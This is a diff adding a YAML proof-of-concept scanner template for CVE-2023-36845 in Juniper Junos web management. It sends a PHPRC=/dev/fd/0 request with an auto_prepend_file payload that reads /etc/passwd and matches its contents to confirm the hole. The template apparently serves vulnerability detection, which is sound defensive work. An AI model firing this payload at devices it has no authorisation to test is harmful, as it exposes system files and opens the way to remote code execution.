@@ -1,0 +1,26 @@
+id: poc-yaml-junos-webauth-operation-php-phprc-rce
+info:
+  name: Junos webauth_operation.php PHPRC 代码执行漏洞(CVE-2023-36845)
+  severity: critical
+  tags:
+  - 两高一弱
+  - rce
+  - CVE-2023-36845
+  finger: junos
+requests:
+- method: GET
+  path: /?PHPRC=/dev/fd/0
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: auto_prepend_file="/etc/passwd"
+  expression: 'status_code == 200
+
+    && contains(body,"root:")
+
+    && contains(body,"/bin")
+
+    && contains(title,"Log In - Juniper Web Device Manager")
+
+    '
+variables: {}
+transport: http
